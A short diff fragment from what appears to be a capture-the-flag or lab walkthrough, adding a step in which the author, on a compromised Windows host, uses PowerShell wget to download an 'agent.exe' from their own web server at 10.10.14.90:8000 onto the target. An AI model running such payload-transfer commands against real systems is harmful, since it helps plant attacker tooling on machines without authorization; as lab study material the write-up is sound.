@@ -654,6 +654,11 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Then ill setup a webserver to transfer the agent to the target
 
 ```python
+C:\Users\C.Bum\Documents>powershell -c wget http://10.10.14.90:8000/agent.exe -o agent.exe
+```
+This transferred it to the target
+
+```python
 
 ```
 
